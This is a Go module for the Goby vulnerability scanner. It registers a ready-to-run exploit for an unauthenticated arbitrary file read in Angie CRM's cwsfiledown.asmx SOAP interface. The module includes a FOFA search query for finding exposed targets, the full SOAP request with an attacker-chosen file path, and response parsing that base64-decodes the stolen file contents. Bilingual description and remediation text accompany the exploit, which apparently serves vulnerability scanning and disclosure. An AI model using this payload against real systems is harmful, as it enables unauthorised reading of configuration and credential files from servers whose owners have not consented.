package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Angie CRM /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx File Read Vulnerability",
    "Description": "<p>The DownFileBytes instance of the cwsfiledown.asmx interface in Angie CRM has an arbitrary file read vulnerability. An unauthenticated attacker can exploit this vulnerability to read important system files (such as database configuration files, system configuration files), putting the website in a highly insecure state.</p>",
    "Product": "Angie CRM",
    "Homepage": "http://h5vshttps.pos99.com/",
    "DisclosureDate": "2024-11-27",
    "PostTime": "2024-11-30",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"CheckSilverlightInstalled\" && body=\"AllowHtmlPopupwindow\"",
    "GobyQuery": "body=\"CheckSilverlightInstalled\" && body=\"AllowHtmlPopupwindow\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure and more severe security issues.</p>",
    "Recommendation": "<p>It is recommended to implement access control on the cwsfiledown.asmx interface to restrict unauthorized access. Additionally, promptly update system patches to fix known vulnerabilities.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/144088323"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "c://windows//win.ini",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://tempuri.org/DownFileBytes"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <DownFileBytes xmlns=\"http://tempuri.org/\">\n      <sFileName>c://windows//win.ini</sFileName>\n      <iPosition>1</iPosition>\n      <iReadBytesLen>100</iReadBytesLen>\n      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>\n    </DownFileBytes>\n  </soap:Body>\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<DownFileBytesResult>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vurlurl|lastbody|variable|{{{fixedhostinfo}}}/EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://tempuri.org/DownFileBytes"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <DownFileBytes xmlns=\"http://tempuri.org/\">\r\n      <sFileName>{{{default}}}</sFileName>\r\n      <iPosition>1</iPosition>\r\n      <iReadBytesLen>100</iReadBytesLen>\r\n      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>\r\n    </DownFileBytes>\r\n  </soap:Body>\r\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<DownFileBytesResult>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output_encoding|lastbody|regex|<bReadBytes>([A-Za-z0-9+/=]+)</bReadBytes>",
                "output|NULL|base64_decode|{{{output_encoding}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "昂捷 CRM /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx 文件读取漏洞",
            "Product": "昂捷CRM",
            "Description": "<p>昂捷CRM的cwsfiledown.asmx接口的DownFileBytes实例存在任意文件读取漏洞。</p><p>未经身份验证的攻击者可以通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件），导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>建议对cwsfiledown.asmx接口进行访问控制，限制未经授权的访问。同时，及时更新系统补丁，修复已知漏洞。</p>",
            "Impact": "<p>该漏洞允许攻击者读取系统中的任意文件，可能导致敏感信息泄露，进而引发更严重的安全问题。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Angie CRM /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx File Read Vulnerability",
            "Product": "Angie CRM",
            "Description": "<p>The DownFileBytes instance of the cwsfiledown.asmx interface in Angie CRM has an arbitrary file read vulnerability. An unauthenticated attacker can exploit this vulnerability to read important system files (such as database configuration files, system configuration files), putting the website in a highly insecure state.</p>",
            "Recommendation": "<p>It is recommended to implement access control on the cwsfiledown.asmx interface to restrict unauthorized access. Additionally, promptly update system patches to fix known vulnerabilities.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure and more severe security issues.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [
        "filePath"
    ],
    "PocId": "9975"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}